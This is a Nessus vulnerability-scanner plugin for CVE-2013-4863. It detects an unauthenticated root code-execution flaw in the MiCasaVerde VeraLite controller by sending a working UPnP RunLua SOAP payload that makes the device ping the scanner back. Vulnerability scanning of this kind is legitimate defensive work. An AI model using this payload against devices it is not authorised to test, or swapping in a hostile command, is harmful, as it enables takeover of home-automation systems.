#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(93911);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/28 21:52:56 $");

  script_cve_id("CVE-2013-4863");
  script_bugtraq_id(61591);
  script_osvdb_id(96050);
  script_xref(name:"EDB-ID", value:"27286");

  script_name(english:"MiCasaVerde VeraLite UPnP RCE");
  script_summary(english:"Attempts to execute a command via the UPnP RunLua action.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote MiCasaVerde VeraLite Smart Home Controller is affected by a
remote code execution vulnerability. An unauthenticated, remote
attacker can exploit this, via the UPnP RunLua action, to execute
arbitrary shell commands as root.

Note that MiCasaVerde VeraLite is reportedly affected by additional
vulnerabilities; however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"http://getvera.com/controllers/veralite/");
  script_set_attribute(attribute:"see_also", value:"https://www3.trustwave.com/spiderlabs/advisories/TWSL2013-019.txt");
  script_set_attribute(attribute:"solution", value:
"The vendor has stated that they will not patch the vulnerability.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/10/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english: "Misc.");
  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencie("upnp_www_server.nasl");
  script_require_keys("upnp/www");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("string.inc");

appname = 'VeraLite';
port = get_kb_item_or_exit('upnp/www');
location = get_kb_item_or_exit('upnp/'+port+'/location');

if ("luaupnp.xml" >!< location) audit(AUDIT_HOST_NOT, 'affected');

payload = '<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
  '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
  '<s:Body>' +
  '<u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1">' +
  '<Code>os.execute(&quot;ping -c 10 ' + this_host() + '&quot;)</Code>' +
  '</u:RunLua>' +
  '</s:Body>' +
  '</s:Envelope>';

request = 'POST /upnp/control/hag HTTP/1.1\r\n' +
  'Host: ' + get_host_ip() + ':' + string(port) + '\r\n' +
  'Content-Type: text/xml; charset="utf-8"\r\n' +
  'Soapaction: "urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua"\r\n' +
  'MIME-Version: 1.0\r\n' +
  'Content-Length: ' + len(payload) + '\r\n' +
  '\r\n' +
  payload;

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL,port, appname);

filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
response = send_capture(socket:soc, data:request, pcap_filter:filter);
icmp = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
close(soc);

if(isnull(icmp)) audit(AUDIT_LISTEN_NOT_VULN, appname, port);

report = '\nNessus was able to execute a command on the remote device.\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
exit(0);
